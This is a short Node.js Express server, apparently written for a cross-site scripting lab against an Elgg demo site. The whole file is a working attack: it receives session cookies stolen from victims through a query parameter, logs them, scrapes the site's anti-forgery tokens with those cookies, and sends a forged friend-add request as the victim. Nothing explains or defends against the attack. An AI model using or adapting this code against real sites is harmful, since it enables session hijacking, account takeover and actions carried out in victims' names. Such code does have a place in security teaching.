const express = require('express');
const got = require('got');
const app = express();
const port = 18080;
const url = 'http://www.xsslabelgg.com/action/friends/add';

app.get('/', async (req, res) => {
    const cookie = req.query.c
    console.log(cookie);
    const { body } = await got(url, {
        headers: {
            cookie
	}
    });
    await got(`${url}?friend=44&${body.match(/__elgg_ts=\d*/g)[0]}&${body.match(/__elgg_token=[^"]*/g)[0]}`, {
        headers: {
            cookie
	}
    });
    res.sendStatus(200);
});

app.listen(port, () => console.log(`http://localhost:${port}`));
